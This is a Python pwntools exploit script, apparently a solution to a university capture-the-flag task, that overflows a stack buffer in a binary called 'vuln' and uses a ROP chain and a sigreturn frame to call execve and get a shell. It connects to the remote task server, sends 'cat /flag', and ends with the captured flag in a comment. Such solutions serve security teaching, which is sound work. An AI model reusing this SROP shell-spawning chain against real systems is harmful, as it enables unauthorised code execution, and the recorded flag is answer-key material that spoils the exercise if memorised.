from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
b *(main+102)
#set detach-on-fork off
#set follow-fork-mode child
set follow-fork-mode parent
#catch fork
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33597)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)
#p2.close()

def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


payload = b"A"*cyclic_find_bytes(0x63616163)

syscall_ret = 0x40103c
# set syscall number
# 4010b3: pop rax; ret;
payload += p64(0x4010b3)
payload += p64(15)
# 40103c: syscall; ret;
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0x3b # sys_execve()
frame.rdi = 0x402029 # const char *filename
frame.rsi = 0 # const char *const argv[]
frame.rdx = 0 # const char *const envp[]
frame.rip = syscall_ret # syscall;ret

payload += bytes(frame)



p.sendline(payload)
p.sendline(b"cat /flag")

p.interactive()


#softsec{qDHaNArSSKjgnnuYdM7Wf-yZ9b5mFYe0IFJFENgE8eHtgyToQziScZx3BgCAhNOu}